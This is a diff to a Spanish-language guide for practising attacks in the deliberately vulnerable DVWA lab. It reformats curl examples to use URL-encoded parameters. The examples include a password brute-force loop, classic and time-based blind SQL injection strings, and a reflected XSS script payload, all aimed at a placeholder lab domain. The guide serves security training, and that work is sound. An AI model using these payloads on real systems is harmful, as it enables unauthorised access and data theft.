@@ -148,7 +148,10 @@ Ejemplo de prueba controlada:
 
 ```bash
 for p in admin password 123456 letmein dvwa qwerty; do
-  curl -s "http://DVWA_DOMAIN/vulnerabilities/brute/?username=admin&password=${p}&Login=Login" \
+  curl -s -G "http://DVWA_DOMAIN/vulnerabilities/brute/" \
+    --data-urlencode "username=admin" \
+    --data-urlencode "password=${p}" \
+    --data-urlencode "Login=Login" \
     -H "Cookie: PHPSESSID=<SESSION>; security=low" \
     | head -n 5
 done
@@ -202,10 +205,14 @@ Ruta principal:
 
 ### Cómo probarlo
 
+Para payloads en query string, evita escribir la URL completa con espacios o comillas sin codificar. En DVWA es mas robusto usar `curl -G` con `--data-urlencode`.
+
 Ejemplo controlado típico en DVWA:
 
 ```bash
-curl -i "http://DVWA_DOMAIN/vulnerabilities/sqli/?id=1' or '1'='1&Submit=Submit" \
+curl -i -G "http://DVWA_DOMAIN/vulnerabilities/sqli/" \
+  --data-urlencode "id=1' or '1'='1" \
+  --data-urlencode "Submit=Submit" \
   -H "Cookie: PHPSESSID=<SESSION>; security=low"
 ```
 
@@ -254,7 +261,9 @@ Ruta principal:
 Ejemplo de prueba controlada:
 
 ```bash
-curl -i "http://DVWA_DOMAIN/vulnerabilities/sqli_blind/?id=1' AND sleep(3)-- -&Submit=Submit" \
+curl -i -G "http://DVWA_DOMAIN/vulnerabilities/sqli_blind/" \
+  --data-urlencode "id=1' AND sleep(3)-- -" \
+  --data-urlencode "Submit=Submit" \
   -H "Cookie: PHPSESSID=<SESSION>; security=low"
 ```
 
@@ -295,7 +304,8 @@ Ruta principal:
 Ejemplo controlado:
 
 ```bash
-curl -i "http://DVWA_DOMAIN/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E" \
+curl -i -G "http://DVWA_DOMAIN/vulnerabilities/xss_r/" \
+  --data-urlencode "name=<script>alert(1)</script>" \
   -H "Cookie: PHPSESSID=<SESSION>; security=low"
 ```
 
